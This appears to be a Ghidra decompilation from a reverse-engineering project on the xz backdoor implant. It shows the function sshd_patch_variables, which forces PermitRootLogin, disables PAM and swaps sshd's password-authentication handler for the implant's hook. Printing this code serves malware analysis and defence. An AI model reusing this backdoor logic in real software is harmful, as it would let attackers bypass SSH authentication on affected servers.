// /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_variables.c
// Function: sshd_patch_variables @ 0x107D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_patch_variables(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, int monitor_reqtype, global_context_t * global_ctx)


/*
 * AutoDoc: Tweaks sshd’s in-memory configuration—optionally forcing PermitRootLogin, disabling PAM, and swapping in the authpassword hook—so the implant’s monitor stubs function regardless of the original sshd settings.
 */
#include "xzre_types.h"


BOOL sshd_patch_variables
               (BOOL skip_root_patch,BOOL disable_pam,BOOL replace_monitor_reqtype,
               int monitor_reqtype,global_context_t *global_ctx)

{
  int iVar1;
  sshd_ctx_t *psVar2;
  sshd_monitor_func_t psVar3;
  int *piVar4;
  uint *puVar5;
  sshd_monitor_func_t *mm_answer_authpassword_ptr;
  int *use_pam;
  int *permit_root_login;
  sshd_ctx_t *sshd_ctx;
  
  if ((((global_ctx == (global_context_t *)0x0) ||
       (psVar2 = global_ctx->sshd_ctx, psVar2 == (sshd_ctx_t *)0x0)) ||
      (psVar3 = psVar2->mm_answer_authpassword_hook, psVar3 == (sshd_monitor_func_t)0x0)) ||
     (psVar2->have_mm_answer_authpassword == 0)) {
    return 0;
  }
  if (skip_root_patch == 0) {
    piVar4 = psVar2->permit_root_login_ptr;
    if (piVar4 == (int *)0x0) {
      return 0;
    }
    iVar1 = *piVar4;
    if (iVar1 < 3) {
      if (iVar1 < 0) {
        return 0;
      }
      *piVar4 = 3;
    }
    else if (iVar1 != 3) {
      return 0;
    }
  }
  if (disable_pam != 0) {
    puVar5 = (uint *)psVar2->use_pam_ptr;
    if (puVar5 == (uint *)0x0) {
      return 0;
    }
    if (1 < *puVar5) {
      return 0;
    }
    *puVar5 = 0;
  }
  if (replace_monitor_reqtype == 0) {
    monitor_reqtype = *(int *)(psVar2->mm_answer_authpassword_ptr + -1) + 1;
  }
  psVar2->monitor_reqtype_authpassword = monitor_reqtype;
  *psVar2->mm_answer_authpassword_ptr = psVar3;
  return 1;
}

